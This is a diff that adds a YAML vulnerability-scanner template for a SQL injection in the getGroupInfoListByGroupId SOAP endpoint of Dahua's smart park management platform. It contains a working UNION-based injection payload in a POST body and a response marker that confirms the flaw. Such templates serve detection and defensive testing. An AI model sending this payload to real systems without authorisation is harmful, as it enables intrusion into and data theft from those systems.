@@ -1,0 +1,24 @@
+name: 大华智慧园区综合管理平台-getGroupInfoListByGroupId-SQL
+description: >-
+  SQL注入
+alwaysExecute: false
+matchCount: 1
+rules:
+  - method: POST
+    path: /portal/services/clientServer
+    headers:
+      Content-Type: text/xml  
+    body: |
+        <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:cli="http://clientServer.webservice.dssc.dahua.com">
+           <soapenv:Header/>
+           <soapenv:Body>
+              <cli:getGroupInfoListByGroupId>
+                 <!--type: string-->
+                 <arg0>5398) UNION ALL SELECT 5336,5336,5336,5336,CONCAT(0x7178787a71,IFNULL(CAST(111*111 AS NCHAR),0x20),0x7171717871)-- -</arg0>
+                 <!--type: long-->
+                 <arg1>10</arg1>
+              </cli:getGroupInfoListByGroupId>
+           </soapenv:Body>
+        </soapenv:Envelope>
+    expression:
+      body_all: ["qxxzq12321"]
